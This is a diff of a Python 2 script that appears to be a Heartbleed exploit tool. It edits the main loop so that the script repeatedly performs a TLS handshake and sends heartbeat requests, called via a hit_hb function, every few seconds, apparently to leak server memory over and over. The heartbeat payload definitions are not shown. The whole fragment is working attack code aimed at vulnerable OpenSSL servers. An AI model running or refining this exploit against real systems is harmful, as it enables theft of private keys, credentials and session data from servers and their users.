@@ -214,12 +214,6 @@ def main():
       s.send("<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n")
       s.recv(BUFSIZ)
 
-    print 'Sending Client Hello...'
-
-    s.send(hello)
-
-    print 'Waiting for Server Hello...'
-
     if opts.tls == 0:
         hb = hb0
     elif opts.tls == 1:
@@ -232,21 +226,29 @@ def main():
         hb = hb3
 
     while True:
-        typ, ver, pay = recvmsg(s)
-        if typ == None:
-            print 'Server closed connection without sending Server Hello.'
-            return
-        # Look for server hello done message.(handshake end here)
-        if typ == 22 and ord(pay[0]) == 0x0E:
-            break
+        print 'Sending Client Hello...'
 
-    print 'Sending heartbeat request...'
-    sys.stdout.flush()
-    # start sending heartbeat request
-    s.send(hb)
-    while True:
-        time.sleep(5)
+        s.send(hello)
+
+        print 'Waiting for Server Hello...'
+
+
+        while True:
+            typ, ver, pay = recvmsg(s)
+            if typ == None:
+                print 'Server closed connection without sending Server Hello.'
+                return
+            # Look for server hello done message.(handshake end here)
+            if typ == 22 and ord(pay[0]) == 0x0E:
+                break
+
+        print 'Sending heartbeat request...'
+        sys.stdout.flush()
+        # start sending heartbeat request
+        s.send(hb)
         hit_hb(s, hb)
+
+        time.sleep(3)
 
 if __name__ == '__main__':
     main()
